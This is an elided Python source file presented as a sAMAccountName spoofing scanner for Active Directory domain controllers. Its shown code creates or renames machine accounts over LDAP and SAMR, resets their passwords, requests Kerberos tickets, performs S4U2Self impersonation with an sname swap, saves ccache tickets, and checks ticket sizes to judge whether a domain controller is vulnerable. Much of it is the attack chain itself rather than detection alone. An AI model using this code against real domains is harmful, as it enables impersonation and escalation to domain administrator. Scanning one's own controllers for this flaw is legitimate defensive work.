#!/usr/bin/env python3
'''SAMACCOUNTNAME SPOOFING ATTACK SCANNER'''
...
class MachineAccount:
    def __init__(self, username, password, domain, options):
        ...
        if self.method == "LDAPS" and "." not in self.domain:
            print(f"'{self.domain}' doesn't look like a FQDN. Generating baseDN will probably fail.")
        ...
        if self.target is None:
            if "." not in self.domain:
                print(f"No DC host set and '{self.domain}' doesn't look like a FQDN. DNS resolution of short names will probably fail.")
        ...
        try:
            ...
            if self.action == "rename":
                if not self.LDAPComputerExists(ldapConn, self.computerName):
                    raise Exception(
                        f"Account {self.computerName} not found in {self.baseDN}!"
                    )
                ...
                if not res:
                    if (
                        ...
                        print(f"User {self.username} doesn't have right to change name for {self.computerName}!")
                        return
                        # raise Exception("User %s doesn't have right to change name for %s!"% (self.username, self.computerName))
                    else:
                        raise Exception(str(ldapConn.result))
                else:
                    print(f"Changed machine account name from {self.computerName} to {self.newComputerName}")

            else:
                if self.LDAPComputerExists(ldapConn, self.computerName):
                    print(f"Machine account {self.computerName} already exists. Trying to change password.")
                    computer = self.LDAPGetComputer(ldapConn, self.computerName)
                    ...
                    if not res:
                        if (
                            ...
                            print(f"User {self.username} doesn't have right to change password for {self.computerName}!")
                            # raise Exception("User %s doesn't have right to change password for %s!" % (self.username, self.computerName))
                        else:
                            print(str(ldapConn.result))
                            #raise Exception(str(ldapConn.result))
                    else:
                        print(f"Changed password for {self.computerName}.")

                    return

                computerHostname = self.computerName[:-1]
                computerDn = f"CN={computerHostname},{self.computerGroup}"

                # Default computer SPNs
                ucd = {
                    "dnsHostName": f"{computerHostname}.{self.domain}",
                    "userAccountControl": 0x1000,
                    "servicePrincipalName": [],
                    "sAMAccountName": self.computerName,
                    "unicodePwd": ('"{self.computerPassword}"').encode("utf-16-le"),
                }
                ...
                if not res:
                    if (
                        ...
                        if error_code == 0x216D:
                            raise Exception(
                                "User {self.username} machine quota exceeded!"
                            )
                        else:
                            raise Exception(str(ldapConn.result))
                    elif (
                        ...
                        print(f"User {self.username} doesn't have right to create a machine account!")
                        return
                        # raise Exception("User %s doesn't have right to create a machine account!" % self.username)
                    else:
                        raise Exception(str(ldapConn.result))
                else:
                    print(f"Added machine account {self.computerName} with password {self.computerPassword}.")
    ...
    def LDAPComputerExists(self, connection, computerName):
        connection.search(self.baseDN, f"(sAMAccountName={computerName})")
    ...
    def LDAP3KerberosLogin(
        ...
        if useCache:
            try:
                ...
                principal = f"ldap/{self.target.upper()}@{self.domain.upper()}"
            ...
            if self.action == "rename":
                try:
                    ...
                    if e.error_code == 0xC0000073:
                        print(f"Account {self.computerName} not found in domain {self.selectedDomain}!")
                        return
                        # raise Exception("Account %s not found in domain %s!"% (self.computerName, selectedDomain))
                    else:
                        raise
                    ...
                    try:
                        ...
                        try:
                            ...
                            if e.error_code == 0xC0000022:
                                print(f"User {self.username} doesn't have right to change password for {self.computerName}!")
                                return
                                # raise Exception(f"User {self.username} doesn't have right to change password for {self.computerName}!")
                            else:
                                return
                                # raise
                        ...
                        print(f"Changed password of {self.computerName} to {self.computerPassword}.")
                        return
                    except samr.DCERPCSessionError as e:
                        if e.error_code != 0xC0000073:
                            raise
                ...
                try:
                    ...
                    if e.error_code == 0xC0000022:
                        ...
                        print(f"User {self.username} machine quota exceeded!")
                        # raise Exception("User %s machine quota exceeded!" % self.username)
                    else:
                        raise
...
def saveTicket(ticket, sessionKey, fileName):
    print(f"Saving ticket in {(fileName + '.ccache')}")
    ccache = CCache()
...
def S4U2Self(tgt, user, domain, spn, impersonate, cipher, sessionKey, kdcHost):
    ...
    print(f"Got TGS for {client} for {server}")
    ...
    print("Changing sname from %s to %s" % (old_sname, server))
...
def scan(user, password, domain, lmhash, nthash, dc):
    ...
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    # print(userName, password, domain, lmhash, nthash,dc)
    # should not have the following try/except
    try:
    ...
    if no_pac_len < pac_len * SCAN_THRESHOLD:
        # Vulnerable
        print(f"Domain controller {dc} is most likely vulnerable")
        return {"ip":dc,"port":'',"vulnerableTosAMAccountSpoofing":True, "username":user, "domain":domain}
    else:
        # Not vulnerable
        print(f"Domain controller {dc} is most likely not vulnerable")
        return {"ip":dc,"port":'',"vulnerableTosAMAccountSpoofing":False, "username":user, "domain":domain}
...
if __name__ == "__main__":
    ...
    try:
        ...
        if options.scan is True:
            print(f"Scanning for sAMAccountName Spoofing attack on domain:{domain}, dc IP: {dc_ip}, and username: {username}...")
            results = scan(username, password, domain, lmhash, nthash, dc_ip)
            if results:
